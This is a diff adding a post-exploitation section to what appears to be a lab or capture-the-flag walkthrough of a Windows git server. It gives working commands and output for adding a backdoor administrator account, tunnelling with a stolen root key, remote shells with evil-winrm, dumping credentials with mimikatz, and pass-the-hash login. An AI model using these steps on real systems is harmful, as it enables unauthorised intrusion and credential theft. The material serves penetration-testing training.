@@ -550,3 +550,114 @@ connect to [10.50.99.2] from (UNKNOWN) [10.200.98.200] 50108
 PS C:\GitStack\gitphp> whoami
 nt authority\system
 ```
+
+# Task 21 - Stabilization and Post Exploitation
+Using the NT Authority\System shell, create a new user, add it to the administrators group, and the remote management group
+```
+PS C:\GitStack\gitphp> net user user-[username] [password] /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators user-[username] /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" user-[username] /add
+The command completed successfully.
+```
+Verify the addition
+```
+net user user-[username]
+User name                    user-[username]
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            28/03/2021 22:11:19
+Password expires             Never
+Password changeable          28/03/2021 22:11:19
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+```
+On the attacking system install evil-winrm
+```
+sudo gem install evil-winrm
+```
+On the attacking system setup a sshuttle connection to the web server to tunnel your traffic to the git server, use your available access to grab the private key for root
+```
+sudo sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i id_rsa" 10.200.98.150/32
+```
+Use evil-winrm to connect to the remote management group
+```
+evil-winrm -u user-[username] -p [password] -i 10.200.98.150
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\user-[username]\Documents> whoami
+git-serv\user-[username]
+*Evil-WinRM* PS C:\Users\user-[username]\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes
+============================================================= ================ ============ ==================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
+BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
+*Evil-WinRM* PS C:\Users\user-[username]\Documents>
+```
+Use xfreerdp as another way of accessing the system with the user you created above
+```
+xfreerdp /v:10.200.98.150 /u:user-[username] /p:[password] +clipboard /dynamic-resolution /drive:/usr/
+share/windows-resources,share-[username]           
+```
+Once connected, open an administrative command prompt and load mimikatz from the share you established above
+```
+\\tsclient\share-[username]\mimikatz\x64\mimikatz.exe
+```
+Use mimikatz to grab hashes
+```
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+```
+Once you have the hashes you can crack them with hashcat or use a website like https://crackstation.net/, you can also use evil-winrm to login remotely
+```
+evil-winrm -u Administrator -H [hash] -i [target]
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+git-serv\administrator
+```
